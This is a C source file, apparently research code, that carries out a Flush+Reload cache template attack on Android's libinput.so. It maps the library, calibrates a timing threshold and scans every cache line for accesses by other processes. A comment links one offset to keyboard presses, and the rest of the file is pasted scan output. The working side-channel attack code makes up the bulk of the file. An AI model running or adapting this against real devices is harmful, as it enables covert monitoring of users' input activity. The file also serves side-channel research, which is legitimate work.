#include <fcntl.h>
#include "term.h"
#include "ncurses.h"
#include "sys/stat.h"

#include "../libs/cacheutils.h"
#include "sched.h"
#include "sys/mman.h"

int main(int argc, char* argv[]) {
    /* char* filename = "/usr/lib/aarch64-linux-gnu/libtinfo.so.6.3"; */
    /* char* filename = "/data/data/com.termux/files/usr/lib/libncursesw.so.6"; */
    char* filename = "/system/lib64/libinput.so";

    /* Open file */
    int fd = open(filename, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Could not open file: %s\n", filename);
        return -1;
    }

    struct stat filestat;
    if (fstat(fd, &filestat) == -1) {
        fprintf(stderr, "Error: Could not obtain file information.\n");
        return -1;
    }

    uint64_t offset = 0x0002d000;
    uint64_t mapped = 0x71438b6000;
    uint64_t symbol = 0x71438d1f98;
    uint64_t at = symbol-mapped;
    at = 0;
    offset = 0;
    /* uint64_t m = (uint64_t)&cbreak; */
    /* uint64_t at = 0x20; */
    /* assert(at < filestat.st_size); */

    /* Map file */
    uint8_t* m = (uint8_t*)mmap(0, filestat.st_size-offset, PROT_READ, MAP_SHARED|MAP_POPULATE, fd, offset);
    if (m == MAP_FAILED) {
        fprintf(stderr, "Could not map file: %s\n", filename);
        return -1;
    }

    /* Start calibration */
    unsigned threshold = 0;
    if (threshold == 0) {
        fprintf(stdout, "[x] Start calibration... ");
        threshold = detect_flush_reload_threshold();
        fprintf(stdout, "%zu\n", threshold);
    }


    // Cortex-X4
    /* threshold = 133; */
    /* Start cache template attack */
    /* fprintf(stdout, "[x] Filename: %s\n", filename); */
    /* fprintf(stdout, "[x] Offset: %zu\n", offset); */
    fprintf(stdout, "[x] Threshold: %zu\n", threshold);
    fflush(stdout);

    /* #define a strnames */

    /* printf("%lx\n", a); */
    /* fflush(stdout); */
    /* printf("%s\n", strnames[1]); */
    /* fflush(stdout); */
    /* printf("%lx\n", &strnames[0]); */
    /* printf("a %p\n", strnames[1]); */
    /* printf("b %p\n", ((char**)(&strnames))[1]); */
    /* printf("%s\n", ((char**)(&strnames))[1]); */
    /* fflush(stdout); */

    printf("ptr: %p\n", m+at);
    /* fflush(stdout); */
    /* printf("%s\n", ((char**)m+at)[1]); */

    int j = 0;

    /* j = 0x400; */
    /* j = 0x53c0; */
    /* j = 0x7b000; */
    /* j = 0x400; */
    /* j = 0x5de40; */
    /* while (1) { */
    /*     uint64_t sum = 0; */
    /*     uint64_t n = 10000; */
    /*     int hits = 0; */
    /*     for (int i = 0; i < n; i++) { */
    /*         /\* sched_yield(); *\/ */
    /*         usleep(10); */
    /*     int me = flush_reload_t((void*)m+at+j); */
    /*     sum += me; */
    /*     if (me < threshold) { */
    /*         hits++; */
    /*     } */
    /*     } */
    /*     /\* if (sum/n < 180) { *\/ */
    /*     /\*     printf("%d - %d\n", hits, sum/n); *\/ */
    /*     /\* } *\/ */
    /*     /\* if (hits > 100) { *\/ */
    /*         printf("%d -\n", hits); */
    /*     /\* } *\/ */
    /*     /\* sched_yield(); *\/ */
    /*     /\* usleep(1); *\/ */
    /*     /\* } *\/ */
    /*     /\* /\\* if (hits > 50) { *\\/ *\/ */
    /*     /\*     printf("%lx %ld %ld\n", j, sum/n, hits); *\/ */
    /*     /\*     fflush(stdout); *\/ */
    /* } */


    getchar();
    printf("started\n");
    printf("size: %lx\n", filestat.st_size);
    /* while (1) { */
    int last_print = -10;
        /* for (j = 0x00238000; j < filestat.st_size; j+=64) { */
        for (j = 0; j < filestat.st_size; j+=64) {
        /* for (j = filestat.st_size-64; j >= 0; j-=64) { */
            if (last_print+1 <= j * 100 / filestat.st_size) {
            /* if (last_print-10 >= j * 100 / filestat.st_size) { */
                printf("%d\n", j * 100 / filestat.st_size);
                last_print = j * 100 / filestat.st_size;
            }
            /* j = 0x0000000000074024; // popup keyboard/short press? */
            /* j = 0xf80; */
            /* j = 0x2b80; */

            /* j = 0x11040; */
            /* uint64_t n = 1000; */

            /* for (int k = 0; k < 3; k++) { */
        uint64_t sum = 0;
        uint64_t n = 1000;
        int hits = 0;
        for (int i = 0; i < n; i++) {
            /* maccess(m+at); */
            int me = flush_reload_t((void*)m+at+j);
            sum += me;
            hits += me < threshold;
            sched_yield();
            /* usleep(1); */
        }
        /* if (sum/n < 400) { */
        /*     printf("%lx %ld %ld\n", j, sum/n, hits); */
        /* } */
        if (hits > 5) {
            printf("%lx %ld %ld\n", j, sum/n, hits);
            fflush(stdout);
        }
            /* } */
        }
    /* } */
}

/* 10840 177 441 */
/* 10e00 192 91 */
/* 10ec0 188 65 */
/* 10f00 192 174 */
/* 11000 188 167 */
/* 11400 203 144 */
/* 11440 196 277 */
/* 114c0 199 104 */



/* f00 285 0 */
/* f40 266 162 */
/* f80 257 2023 */
/* fc0 288 0 */
/* 1000 281 109 */

/* 1380 286 0 */
/* 13c0 280 186 */

/* 1fc0 289 0 */
/* 2000 284 182 */
/* 2040 239 1760 */

/* 1040 245 398 */
/* 1040 216 473 */
/* 12c0 264 56 */
/* 3c40 262 181 */
/* 3c40 249 321 */
/* 4a00 241 449 */
/* 4cc0 253 69 */
/* 4cc0 239 345 */
/* ^C */

/* 2a00 285 0 */
/* 2a40 279 170 */
/* 2a80 288 0 */
/* 2ac0 288 0 */
/* 2b00 286 0 */
/* 2b40 288 0 */
/* 2b80 277 598 */

/* [x] Start calibration... 213 */
/* [x] Threshold: 213 */
/* ptr: 0x6f94600000 */

/* started */
/* size: 275b00 */
/* 0 */
/* 400 246 821 */
/* 1 */
/* 2 */
/* 3 */
/* 4 */
/* 19d00 245 14 */
/* 19d40 244 19 */
/* 19dc0 244 28 */
/* 19e00 243 24 */
/* 19e80 244 24 */
/* 1ae80 248 25 */
/* 1af40 287 12 */
/* 5 */
/* 21140 319 60 */
/* 211c0 241 62 */
/* 21200 247 25 */
/* 6 */
/* 7 */
/* 2d680 249 11 */
/* 2f040 244 12 */
/* 2f0c0 244 15 */
/* 2f100 245 17 */
/* 2f180 244 14 */
/* 2f300 353 23 */
/* 2f380 271 16 */
/* 8 */
/* 9 */
/* 10 */
/* 40a80 249 12 */
/* 40b40 307 19 */
/* 42a40 241 58 */
/* 42ac0 348 37 */
/* 42b00 243 24 */
/* 42b80 243 49 */
/* 42c00 249 11 */
/* 11 */
/* 12 */
/* 4d440 245 22 */
/* 4d4c0 309 17 */
/* 13 */
/* 53d40 288 16 */
/* 53dc0 286 21 */
/* 53e00 242 41 */
/* 53e80 242 51 */
/* 53f40 242 52 */
/* 53fc0 242 53 */
/* 54040 244 13 */
/* 540c0 243 22 */
/* 54100 243 22 */
/* 55cc0 245 19 */
/* 55d00 243 20 */
/* 55d80 244 11 */
/* 14 */
/* 15 */
/* 5fd00 244 27 */
/* 16 */
/* 67640 244 26 */
/* 676c0 245 13 */
/* 67700 245 12 */
/* 69700 245 15 */
/* 69740 278 12 */
/* 69780 243 30 */

/* 7b000 241 70                                                                                                                                                                                                                                                                                                 07:49:10 [73/1835] */
/* 7b080 242 50 */
/* 7b780 263 36 */
/* 7b840 244 11 */
/* 7ba40 244 16 */
/* 7bac0 244 27 */
/* 7bb00 243 33 */
/* 7c140 244 17 */
/* 7c1c0 243 30 */
/* 7c200 283 16 */
/* 7c240 245 11 */
/* 7c280 262 22 */
/* 7c2c0 310 13 */
/* 7c340 249 11 */
/* 7c6c0 244 17 */
/* 7c700 245 15 */
/* 7c840 243 46 */
/* 7c8c0 560 42 */
/* 7c900 277 33 */
/* 7c980 243 20 */
/* 7cb00 247 30 */
/* 7cb80 242 56 */
/* 7cc00 263 42 */
/* 7cc80 244 13 */
/* 7cdc0 247 35 */
/* 7ce00 242 42 */
/* 7ce80 242 43 */
/* 7cf40 244 14 */
/* 7cfc0 244 15 */
/* 7d080 241 63 */
/* 7d140 242 61 */
/* 7d840 244 14 */
/* 7d880 245 17 */
/* 7dac0 267 13 */
/* 7de00 249 18 */
/* 7de40 258 22 */
/* 7de80 245 36 */
/* 20 */
/* 7e000 246 51 */
/* 7e080 241 67 */
/* 7e140 293 11 */
/* 7e3c0 243 25 */
/* 7e780 246 40 */
/* 7e8c0 272 12 */
/* 7ee00 243 29 */
/* 7ee40 244 16 */
/* 7ee80 257 27 */
/* 7eec0 245 17 */
/* 7efc0 243 36 */
/* 7f040 242 54 */
/* 7f480 242 49 */
/* 7f540 242 58 */
/* 7f5c0 273 40 */
/* 7f600 275 52 */
/* 7f680 279 67 */
/* 7f740 244 13 */
/* 7ff00 296 11 */
/* 7ff40 245 11 */
/* 7ff80 243 28 */
/* 7ffc0 312 20 */
/* 800c0 245 16 */
/* 80180 352 20 */
/* 80340 261 23 */
/* 80380 275 28 */
/* 803c0 245 12 */
/* 80400 246 16 */
/* 80b40 242 43 */
/* 80f80 250 14 */
/* 81040 243 16 */
/* 810c0 242 43 */
/* 81100 242 61 */
/* 81180 242 43 */
/* 815c0 244 44 */
/* 81600 243 28 */
/* 81680 244 18 */
/* 21 */
